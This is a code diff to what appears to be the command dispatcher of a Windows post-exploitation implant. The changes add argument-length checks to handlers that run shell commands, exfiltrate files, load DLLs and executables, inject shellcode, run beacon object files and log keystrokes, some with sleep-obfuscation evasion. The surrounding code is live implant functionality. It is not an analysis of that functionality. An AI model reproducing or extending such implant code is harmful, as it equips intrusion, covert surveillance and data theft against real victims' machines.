@@ -92,6 +92,10 @@ dispatch::pwd(const std::vector<std::string> &args, const implant_context &ctx) 
 
 command_output
 dispatch::cd(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
 }
 
@@ -104,6 +108,10 @@ dispatch::ls(const std::vector<std::string> &args, const implant_context &ctx) {
 
 command_output
 dispatch::cat(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
 }
 
@@ -116,30 +124,50 @@ dispatch::whoami(const std::vector<std::string> &args, const implant_context &ct
 
 command_output
 dispatch::rm(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
 }
 
 
 command_output
 dispatch::mkdir(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
 }
 
 
 command_output
 dispatch::cp(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 3) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
 }
 
 
 command_output
 dispatch::ps(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
 }
 
 
 command_output
 dispatch::cmd(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
     return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
 }
 
@@ -168,6 +196,11 @@ dispatch::procenum(const std::vector<std::string> &args, const implant_context &
 
 command_output
 dispatch::exfil(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
+
     HANDLE hfile = tasking::get_file_handle(args[1]);
     if(hfile == nullptr) {
         return { format_output(io::win32_failure("upload", "CreateFileA")), nullptr, output_type::PLAIN_TEXT };
@@ -190,6 +223,10 @@ dispatch::screenshot(const std::vector<std::string> &args, const implant_context
 
 command_output
 dispatch::rundll(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
 
     obfus::sleep(ctx);
     std::string dll_file;
@@ -219,6 +256,10 @@ dispatch::rundll(const std::vector<std::string> &args, const implant_context &ct
 
 command_output
 dispatch::runexe(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 3) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
 
     obfus::sleep(ctx);
     std::string exe_file;
@@ -248,6 +289,10 @@ dispatch::runexe(const std::vector<std::string> &args, const implant_context &ct
 
 command_output
 dispatch::runshellcode(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 3) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
 
     obfus::sleep(ctx);
     std::string shellcode_buff;
@@ -288,6 +333,11 @@ dispatch::runshellcode(const std::vector<std::string> &args, const implant_conte
 
 command_output
 dispatch::runbof(const std::vector<std::string> &args, const implant_context &ctx) {
+    if(args.size() < 3) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
+
     obfus::sleep(ctx);
     std::string bof_buff;
 
@@ -312,6 +362,10 @@ dispatch::runbof(const std::vector<std::string> &args, const implant_context &ct
 
 command_output
 dispatch::keylog(const std::vector<std::string>& args, const implant_context& ctx) {
+    if(args.size() < 2) {
+        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
+    }
+
 
     if(ctx.use_sleepmask) {
         return { format_output("This command is not supported with sleepmask enabled."), nullptr, output_type::PLAIN_TEXT };
